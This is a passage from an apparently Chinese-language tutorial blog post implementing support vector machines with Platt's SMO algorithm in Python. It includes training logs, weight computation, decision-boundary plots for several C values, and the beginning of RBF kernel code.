class="params">(i, oS, Ei)</span>:</span>         <span class="comment">#this is the second choice -heurstic, and calcs Ej</span></span><br><span class="line">    maxK = <span class="number">-1</span>; maxDeltaE = <span class="number">0</span>; Ej = <span class="number">0</span></span><br><span class="line">    oS.eCache[i] = [<span class="number">1</span>,Ei]  <span class="comment">#set valid #choose the alpha that gives the maximum delta E</span></span><br><span class="line">    validEcacheList = nonzero(oS.eCache[:,<span class="number">0</span>].A)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> (len(validEcacheList)) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> validEcacheList:   <span class="comment">#loop through valid Ecache values and find the one that maximizes delta E</span></span><br><span class="line">            <span class="keyword">if</span> k == i: <span class="keyword">continue</span> <span class="comment">#don't calc for i, waste of time</span></span><br><span class="line">            Ek = calcEk(oS, k)</span><br><span class="line">            deltaE = abs(Ei - Ek)</span><br><span class="line">            <span class="keyword">if</span> (deltaE &gt; maxDeltaE):</span><br><span class="line">                maxK = k; maxDeltaE = deltaE; Ej = Ek</span><br><span class="line">        <span class="keyword">return</span> maxK, Ej</span><br><span class="line">    <span class="keyword">else</span>:   <span class="comment">#in this case (first time around) we don't have any valid eCache values</span></span><br><span class="line">        j = selectJrand(i, oS.m)</span><br><span class="line">        Ej = calcEk(oS, j)</span><br><span class="line">    <span class="keyword">return</span> j, Ej</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">updateEk</span><span class="params">(oS, k)</span>:</span><span class="comment">#after any alpha has changed update the new value in the cache</span></span><br><span class="line">    Ek = calcEk(oS, k)</span><br><span class="line">    oS.eCache[k] = [<span class="number">1</span>,Ek]</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">innerL</span><span class="params">(i, oS)</span>:</span></span><br><span class="line">    Ei = calcEk(oS, i)</span><br><span class="line">    <span class="comment">#判断是否可以优化，不可以直接返回0，</span></span><br><span class="line">    <span class="comment">#可以优化则搜索j，第一次是随机的，并且添加0到临时e表里，因为只有一个数值，所以随机选择j</span></span><br><span class="line">    <span class="comment">#之后更新alpah-i j对，更新i,j的e值，返回结果</span></span><br><span class="line">    <span class="comment">#第二次进入内训，i=1,添加1到临时表，j因为有两个所以选j=0，</span></span><br><span class="line">    <span class="comment">#一遍循环后临时e表都有了，之后就能按照alpah不是0的来选择最佳的j</span></span><br><span class="line">    <span class="keyword">if</span> ((oS.labelMat[i]*Ei &lt; -oS.tol) <span class="keyword">and</span> (oS.alphas[i] &lt; oS.C)) <span class="keyword">or</span> ((oS.labelMat[i]*Ei &gt; oS.tol) <span class="keyword">and</span> (oS.alphas[i] &gt; <span class="number">0</span>)):</span><br><span class="line">        j,Ej = selectJ(i, oS, Ei) <span class="comment">#this has been changed from selectJrand</span></span><br><span class="line">        alphaIold = oS.alphas[i].copy(); alphaJold = oS.alphas[j].copy();</span><br><span class="line">        <span class="keyword">if</span> (oS.labelMat[i] != oS.labelMat[j]):</span><br><span class="line">            L = max(<span class="number">0</span>, oS.alphas[j] - oS.alphas[i])</span><br><span class="line">            H = min(oS.C, oS.C + oS.alphas[j] - oS.alphas[i])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            L = max(<span class="number">0</span>, oS.alphas[j] + oS.alphas[i] - oS.C)</span><br><span class="line">            H = min(oS.C, oS.alphas[j] + oS.alphas[i])</span><br><span class="line">        <span class="keyword">if</span> L==H: </span><br><span class="line">            <span class="comment">#print("L==H")</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        eta = <span class="number">2.0</span> * oS.X[i,:]*oS.X[j,:].T - oS.X[i,:]*oS.X[i,:].T - oS.X[j,:]*oS.X[j,:].T</span><br><span class="line">        <span class="keyword">if</span> eta &gt;= <span class="number">0</span>: </span><br><span class="line">            <span class="comment">#print("eta&gt;=0")</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        oS.alphas[j] -= oS.labelMat[j]*(Ei - Ej)/eta</span><br><span class="line">        oS.alphas[j] = clipAlpha(oS.alphas[j],H,L)</span><br><span class="line">        <span class="comment">#因为alpha_j改变了，所以需要重新计算，为什么不是一起更新</span></span><br><span class="line">        updateEk(oS, j) <span class="comment">#added this for the Ecache</span></span><br><span class="line">        <span class="keyword">if</span> (abs(oS.alphas[j] - alphaJold) &lt; <span class="number">0.00001</span>): </span><br><span class="line">            <span class="comment">#print("j not moving enough")</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        oS.alphas[i] += oS.labelMat[j]*oS.labelMat[i]*(alphaJold - oS.alphas[j])<span class="comment">#update i by the same amount as j</span></span><br><span class="line">        updateEk(oS, i) <span class="comment">#added this for the Ecache                    #the update is in the oppostie direction</span></span><br><span class="line">        b1 = oS.b - Ei- oS.labelMat[i]*(oS.alphas[i]-alphaIold)*oS.X[i,:]*oS.X[i,:].T - oS.labelMat[j]*(oS.alphas[j]-alphaJold)*oS.X[i,:]*oS.X[j,:].T</span><br><span class="line">        b2 = oS.b - Ej- oS.labelMat[i]*(oS.alphas[i]-alphaIold)*oS.X[i,:]*oS.X[j,:].T - oS.labelMat[j]*(oS.alphas[j]-alphaJold)*oS.X[j,:]*oS.X[j,:].T</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> &lt; oS.alphas[i]) <span class="keyword">and</span> (oS.C &gt; oS.alphas[i]): oS.b = b1</span><br><span class="line">        <span class="keyword">elif</span> (<span class="number">0</span> &lt; oS.alphas[j]) <span class="keyword">and</span> (oS.C &gt; oS.alphas[j]): oS.b = b2</span><br><span class="line">        <span class="keyword">else</span>: oS.b = (b1 + b2)/<span class="number">2.0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">innerL1</span><span class="params">(i, oS)</span>:</span> <span class="comment">#一起更新临时e</span></span><br><span class="line">    Ei = calcEk(oS, i)</span><br><span class="line">    <span class="comment">#判断是否可以优化，不可以直接返回0，</span></span><br><span class="line">    <span class="comment">#可以优化则搜索j，第一次是随机的，并且添加0到临时e表里，因为只有一个数值，所以随机选择j</span></span><br><span class="line">    <span class="comment">#之后更新alpah-i j对，更新i,j的e值，返回结果</span></span><br><span class="line">    <span class="comment">#第二次进入内训，i=1,添加1到临时表，j因为有两个所以选j=0，</span></span><br><span class="line">    <span class="comment">#一遍循环后临时e表都有了，之后就能按照alpah不是0的来选择最佳的j</span></span><br><span class="line">    <span class="keyword">if</span> ((oS.labelMat[i]*Ei &lt; -oS.tol) <span class="keyword">and</span> (oS.alphas[i] &lt; oS.C)) <span class="keyword">or</span> ((oS.labelMat[i]*Ei &gt; oS.tol) <span class="keyword">and</span> (oS.alphas[i] &gt; <span class="number">0</span>)):</span><br><span class="line">        j,Ej = selectJ(i, oS, Ei) <span class="comment">#this has been changed from selectJrand</span></span><br><span class="line">        alphaIold = oS.alphas[i].copy(); alphaJold = oS.alphas[j].copy();</span><br><span class="line">        <span class="keyword">if</span> (oS.labelMat[i] != oS.labelMat[j]):</span><br><span class="line">            L = max(<span class="number">0</span>, oS.alphas[j] - oS.alphas[i])</span><br><span class="line">            H = min(oS.C, oS.C + oS.alphas[j] - oS.alphas[i])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            L = max(<span class="number">0</span>, oS.alphas[j] + oS.alphas[i] - oS.C)</span><br><span class="line">            H = min(oS.C, oS.alphas[j] + oS.alphas[i])</span><br><span class="line">        <span class="keyword">if</span> L==H: </span><br><span class="line">            <span class="comment">#print("L==H")</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        eta = <span class="number">2.0</span> * oS.X[i,:]*oS.X[j,:].T - oS.X[i,:]*oS.X[i,:].T - oS.X[j,:]*oS.X[j,:].T</span><br><span class="line">        <span class="keyword">if</span> eta &gt;= <span class="number">0</span>: </span><br><span class="line">            <span class="comment">#print("eta&gt;=0"); </span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        oS.alphas[j] -= oS.labelMat[j]*(Ei - Ej)/eta</span><br><span class="line">        oS.alphas[j] = clipAlpha(oS.alphas[j],H,L)</span><br><span class="line">        <span class="keyword">if</span> (abs(oS.alphas[j] - alphaJold) &lt; <span class="number">0.00001</span>): </span><br><span class="line">            <span class="comment">#print("j not moving enough")</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        oS.alphas[i] += oS.labelMat[j]*oS.labelMat[i]*(alphaJold - oS.alphas[j])<span class="comment">#update i by the same amount as j</span></span><br><span class="line">        updateEk(oS,j)</span><br><span class="line">        updateEk(oS, i) <span class="comment">#added this for the Ecache                    #the update is in the oppostie direction</span></span><br><span class="line">        b1 = oS.b - Ei- oS.labelMat[i]*(oS.alphas[i]-alphaIold)*oS.X[i,:]*oS.X[i,:].T - oS.labelMat[j]*(oS.alphas[j]-alphaJold)*oS.X[i,:]*oS.X[j,:].T</span><br><span class="line">        b2 = oS.b - Ej- oS.labelMat[i]*(oS.alphas[i]-alphaIold)*oS.X[i,:]*oS.X[j,:].T - oS.labelMat[j]*(oS.alphas[j]-alphaJold)*oS.X[j,:]*oS.X[j,:].T</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> &lt; oS.alphas[i]) <span class="keyword">and</span> (oS.C &gt; oS.alphas[i]): oS.b = b1</span><br><span class="line">        <span class="keyword">elif</span> (<span class="number">0</span> &lt; oS.alphas[j]) <span class="keyword">and</span> (oS.C &gt; oS.alphas[j]): oS.b = b2</span><br><span class="line">        <span class="keyword">else</span>: oS.b = (b1 + b2)/<span class="number">2.0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">smoP</span><span class="params">(dataMatIn, classLabels, C, toler, maxIter)</span>:</span>    <span class="comment">#full Platt SMO</span></span><br><span class="line">    oS = optStruct(mat(dataMatIn),mat(classLabels).transpose(),C,toler)</span><br><span class="line">    iter = <span class="number">0</span></span><br><span class="line">    entireSet = <span class="literal">True</span>; alphaPairsChanged = <span class="number">0</span></span><br><span class="line">    <span class="comment">#当循环数不满时并且是循环整个数据集或者不是循环整个数据集但是有alpha对改变时</span></span><br><span class="line">    <span class="keyword">while</span> (iter &lt; maxIter) <span class="keyword">and</span> ((alphaPairsChanged &gt; <span class="number">0</span>) <span class="keyword">or</span> (entireSet)):</span><br><span class="line">        alphaPairsChanged = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> entireSet:   <span class="comment">#go over all</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(oS.m):        </span><br><span class="line">                alphaPairsChanged += innerL(i,oS)</span><br><span class="line">                <span class="comment">#print("fullSet, iter: %d i:%d, pairs changed %d" % (iter,i,alphaPairsChanged))</span></span><br><span class="line">            print(<span class="string">"fullSet, iter: %d , pairs changed %d"</span> % (iter,alphaPairsChanged))</span><br><span class="line">            iter += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:<span class="comment">#go over non-bound (railed) alphas</span></span><br><span class="line">            nonBoundIs = nonzero((oS.alphas.A &gt; <span class="number">0</span>) * (oS.alphas.A &lt; C))[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> nonBoundIs:</span><br><span class="line">                alphaPairsChanged += innerL(i,oS)</span><br><span class="line">                <span class="comment">#print("non-bound, iter: %d i:%d, pairs changed %d" % (iter,i,alphaPairsChanged))</span></span><br><span class="line">            print(<span class="string">"non-bound, iter: %d , pairs changed %d"</span> % (iter,alphaPairsChanged))</span><br><span class="line">            iter += <span class="number">1</span></span><br><span class="line">        <span class="comment">#第一次循环为整个，循环后改变为循环non-bound，如果没有a对改变，则变成整个的数据集</span></span><br><span class="line">        <span class="comment">#在整个数据集循环后没有a对改变时，跳出循环，结束</span></span><br><span class="line">        <span class="keyword">if</span> entireSet: entireSet = <span class="literal">False</span> <span class="comment">#toggle entire set loop</span></span><br><span class="line">        <span class="keyword">elif</span> (alphaPairsChanged == <span class="number">0</span>): entireSet = <span class="literal">True</span>  </span><br><span class="line">        print(<span class="string">"iteration number: %d"</span> % iter)</span><br><span class="line">    <span class="keyword">return</span> oS.b,oS.alphas</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data_arr, label_arr = loadDataset(<span class="string">'../../Downloads/machinelearninginaction/Ch06/testSet.txt'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b, alphas = smoP(data_arr,label_arr,<span class="number">0.6</span>,<span class="number">0.001</span>,<span class="number">40</span>)</span><br></pre></td></tr></table></figure>
<pre><code>fullSet, iter: 0 , pairs changed 6
iteration number: 1
non-bound, iter: 1 , pairs changed 0
iteration number: 2
fullSet, iter: 2 , pairs changed 0
iteration number: 3
</code></pre><p>$w = \sum\limits_{i=1}^m\alpha_iy_ix_i$</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#计算w值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_ws</span><span class="params">(alphas,data_arr,class_labels)</span>:</span></span><br><span class="line">    x = np.mat(data_arr)</span><br><span class="line">    label_mat = np.mat(class_labels).transpose()</span><br><span class="line">    m,n = np.shape(x)</span><br><span class="line">    w = np.zeros((n,<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        w += np.multiply(alphas[i] * label_mat[i], x[i,:].T)</span><br><span class="line">    <span class="keyword">return</span> w</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_ws</span><span class="params">(alphas,data_arr,class_labels)</span>:</span></span><br><span class="line">    <span class="comment">#向量来求解</span></span><br><span class="line">    x = np.mat(data_arr);label_mat = np.mat(class_labels).T</span><br><span class="line">    w = x.T * np.multiply(alphas,label_mat) </span><br><span class="line">    <span class="keyword">return</span> w</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc_ws(alphas,data_arr,label_arr)</span><br></pre></td></tr></table></figure>
<pre><code>matrix([[ 0.65307162],
        [-0.17196128]])
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc_ws(alphas,data_arr,label_arr)</span><br></pre></td></tr></table></figure>
<pre><code>matrix([[ 0.65307162],
        [-0.17196128]])
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#绘制样本</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showClassifer</span><span class="params">(dataMat, w, b)</span>:</span></span><br><span class="line">    <span class="comment">#绘制样本点</span></span><br><span class="line">    data_plus = []                                  <span class="comment">#正样本</span></span><br><span class="line">    data_minus = []                                 <span class="comment">#负样本</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(dataMat)):</span><br><span class="line">        <span class="keyword">if</span> label_arr[i] &gt; <span class="number">0</span>:</span><br><span class="line">            data_plus.append(dataMat[i])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data_minus.append(dataMat[i])</span><br><span class="line">    data_plus_np = np.array(data_plus)              <span class="comment">#转换为numpy矩阵</span></span><br><span class="line">    data_minus_np = np.array(data_minus)            <span class="comment">#转换为numpy矩阵</span></span><br><span class="line">    plt.scatter(np.transpose(data_plus_np)[<span class="number">0</span>], np.transpose(data_plus_np)[<span class="number">1</span>], s=<span class="number">30</span>, alpha=<span class="number">0.7</span>)   <span class="comment">#正样本散点图</span></span><br><span class="line">    plt.scatter(np.transpose(data_minus_np)[<span class="number">0</span>], np.transpose(data_minus_np)[<span class="number">1</span>], s=<span class="number">30</span>, alpha=<span class="number">0.7</span>) <span class="comment">#负样本散点图</span></span><br><span class="line">    <span class="comment">#绘制直线</span></span><br><span class="line">    x1 = max(dataMat)[<span class="number">0</span>]</span><br><span class="line">    x2 = min(dataMat)[<span class="number">0</span>]</span><br><span class="line">    a1, a2 = w</span><br><span class="line">    b = float(b)</span><br><span class="line">    a1 = float(a1[<span class="number">0</span>])</span><br><span class="line">    a2 = float(a2[<span class="number">0</span>])</span><br><span class="line">    y1, y2 = (-b- a1*x1)/a2, (-b - a1*x2)/a2</span><br><span class="line">    plt.plot([x1, x2], [y1, y2])</span><br><span class="line">    <span class="comment">#找出支持向量点</span></span><br><span class="line">    <span class="keyword">for</span> i, alpha <span class="keyword">in</span> enumerate(alphas):</span><br><span class="line">        <span class="keyword">if</span> abs(alpha) &gt; <span class="number">0</span>:</span><br><span class="line">            x, y = dataMat[i]</span><br><span class="line">            plt.scatter([x], [y], s=<span class="number">150</span>, c=<span class="string">'none'</span>, alpha=<span class="number">0.7</span>, linewidth=<span class="number">1.5</span>, edgecolor=<span class="string">'red'</span>)</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pylab <span class="keyword">as</span> plt</span><br><span class="line">%matplotlib inline</span><br></pre></td></tr></table></figure>
<p>c越高，说明越不能容忍出现误差,容易过拟合。C越小，容易欠拟合。C过大或过小，泛化能力变差</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b, alphas = smo_simple(data_arr,label_arr,<span class="number">0.6</span>,<span class="number">0.001</span>,<span class="number">10</span>)</span><br><span class="line">ws = calc_ws(alphas,data_arr,label_arr)</span><br><span class="line">showClassifer(data_arr,ws,b)</span><br></pre></td></tr></table></figure>
<pre><code>fullSet, iter: 0 , pairs changed 3
iteration number: 0
fullSet, iter: 0 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 4
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 3
iteration number: 0
fullSet, iter: 0 , pairs changed 2
iteration number: 0
fullSet, iter: 0 , pairs changed 2
iteration number: 0
fullSet, iter: 0 , pairs changed 4
iteration number: 0
fullSet, iter: 0 , pairs changed 3
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 3
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 0
iteration number: 2
fullSet, iter: 2 , pairs changed 0
iteration number: 3
fullSet, iter: 3 , pairs changed 0
iteration number: 4
fullSet, iter: 4 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 2
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 2
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 0
iteration number: 2
fullSet, iter: 2 , pairs changed 0
iteration number: 3
fullSet, iter: 3 , pairs changed 0
iteration number: 4
fullSet, iter: 4 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 0
iteration number: 2
fullSet, iter: 2 , pairs changed 0
iteration number: 3
fullSet, iter: 3 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 0
iteration number: 2
fullSet, iter: 2 , pairs changed 0
iteration number: 3
fullSet, iter: 3 , pairs changed 2
iteration number: 0
fullSet, iter: 0 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 0
iteration number: 2
fullSet, iter: 2 , pairs changed 0
iteration number: 3
fullSet, iter: 3 , pairs changed 0
iteration number: 4
fullSet, iter: 4 , pairs changed 0
iteration number: 5
fullSet, iter: 5 , pairs changed 0
iteration number: 6
fullSet, iter: 6 , pairs changed 0
iteration number: 7
fullSet, iter: 7 , pairs changed 0
iteration number: 8
fullSet, iter: 8 , pairs changed 0
iteration number: 9
fullSet, iter: 9 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 0
iteration number: 2
fullSet, iter: 2 , pairs changed 0
iteration number: 3
fullSet, iter: 3 , pairs changed 0
iteration number: 4
fullSet, iter: 4 , pairs changed 0
iteration number: 5
fullSet, iter: 5 , pairs changed 0
iteration number: 6
fullSet, iter: 6 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 0
iteration number: 2
fullSet, iter: 2 , pairs changed 0
iteration number: 3
fullSet, iter: 3 , pairs changed 3
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 0
iteration number: 2
fullSet, iter: 2 , pairs changed 0
iteration number: 3
fullSet, iter: 3 , pairs changed 0
iteration number: 4
fullSet, iter: 4 , pairs changed 0
iteration number: 5
fullSet, iter: 5 , pairs changed 0
iteration number: 6
fullSet, iter: 6 , pairs changed 0
iteration number: 7
fullSet, iter: 7 , pairs changed 0
iteration number: 8
fullSet, iter: 8 , pairs changed 0
iteration number: 9
fullSet, iter: 9 , pairs changed 0
iteration number: 10
</code></pre><p><img src="/public/pic/output_55_1.png" alt="png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b, alphas = smoP(data_arr,label_arr,<span class="number">0.6</span>,<span class="number">0.001</span>,<span class="number">40</span>)</span><br><span class="line">ws = calc_ws(alphas,data_arr,label_arr)</span><br><span class="line">showClassifer(data_arr,ws,b)</span><br></pre></td></tr></table></figure>
<pre><code>fullSet, iter: 0 , pairs changed 6
iteration number: 1
non-bound, iter: 1 , pairs changed 0
iteration number: 2
fullSet, iter: 2 , pairs changed 0
iteration number: 3
</code></pre><p><img src="/public/pic/output_56_1.png" alt="png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b, alphas = smoP(data_arr,label_arr,<span class="number">0.01</span>,<span class="number">0.001</span>,<span class="number">40</span>)</span><br><span class="line">ws = calc_ws(alphas,data_arr,label_arr)</span><br><span class="line">showClassifer(data_arr,ws,b)</span><br></pre></td></tr></table></figure>
<pre><code>fullSet, iter: 0 , pairs changed 10
iteration number: 1
non-bound, iter: 1 , pairs changed 0
iteration number: 2
fullSet, iter: 2 , pairs changed 0
iteration number: 3
</code></pre><p><img src="/public/pic/output_57_1.png" alt="png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b, alphas = smoP(data_arr,label_arr,<span class="number">55</span>,<span class="number">0.001</span>,<span class="number">40</span>)</span><br><span class="line">ws = calc_ws(alphas,data_arr,label_arr)</span><br><span class="line">showClassifer(data_arr,ws,b)</span><br></pre></td></tr></table></figure>
<pre><code>fullSet, iter: 0 , pairs changed 8
iteration number: 1
non-bound, iter: 1 , pairs changed 0
iteration number: 2
fullSet, iter: 2 , pairs changed 0
iteration number: 3
</code></pre><p><img src="/public/pic/output_58_1.png" alt="png"></p>
<p>核函数<br>径向基核函数<br>$k(x,y) = exp(\frac{-||x -y||^2}{2\sigma^2})$</p>
<p>自变量为向量，可以计算自变量相对于(0,0)或者其他的向量距离</p>
<p>$\sigma$为到达率(reach)或者函数值跌落到0的速度参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#转换核函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">kernelTrans</span><span class="params">(X,A,kTup)</span>:</span></span><br><span class="line">    <span class="string">"""X为整个数据集，A为其中一行，计算A行和整个数据集的核函数内积</span></span><br><span class="line"><span class="string">        如果是线性，的则直接得到x * xi^T</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    m,n = shape(X)</span><br><span class="line">    K = np.mat(np.zeros((m,<span class="number">1</span>)))</span><br><span class="line">    <span class="keyword">if</span> kTup[<span class="number">0</span>] == <span class="string">'lin'</span>:</span><br><span class="line">        K = X * A.T <span class="comment">#数据集i列的内积 (m,n) * (n,1) =&gt; (m,1)</span></span><br><span class="line">    <span class="keyword">elif</span> kTup[<span class="number">0</span>] == <span class="string">'rbf'</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(m): <span class="comment">#读取第j行的值,x </span></span><br><span class="line">            deltaRow = X[j,:]  -A <span class="comment">#j行减去i行的差，x-y (1,n)</span></span><br><span class="line">            K[j] = deltaRow * deltaRow.T <span class="comment">#得到L2反数</span></span><br><span class="line">        K = exp(K / (<span class="number">-1</span> * kTup[<span class="number">1</span>] ** <span class="number">2</span>)) <span class="comment">#各值计算得到和函数的值,k有m行</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> NameError(<span class="string">'Houston we have a problem --That Kernel is not recognized'</span>)</span><br><span class="line">    <span class="keyword">return</span> K</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">optStructk</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,dataMatIn, classLabels, C, toler, kTup)</span>:</span>  <span class="comment"># Initialize the structure with the parameters </span></span><br><span class="line">        self.X = dataMatIn</span><br><span class="line">        self.labelMat = classLabels</span><br><span class="line">        self.C = C</span><br><span class="line">        self.tol = toler</span><br><span class="line">        self.m = shape(dataMatIn)[<span class="number">0</span>]</span><br><span class="line">        self.alphas = mat(zeros((self.m,<span class="number">1</span>)))</span><br><span class="line">        self.b = <span class="number">0</span></span><br><span class="line">        self.eCache = mat(zeros((self.m,<span class="number">2</span>))) <span class="comment">#first column is valid flag</span></span><br><span class="line">        <span class="comment">#K为i,j的内积</span></span><br><span class="line">        self.K = mat(zeros((self.m,self.m)))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.m):</span><br><span class="line">            <span class="comment">#得到第i列的值即y</span></span><br><span class="line">            self.K[:,i] = kernelTrans(self.X, self.X[i,:], kTup)</span><br></pre></td></tr></table></figure>
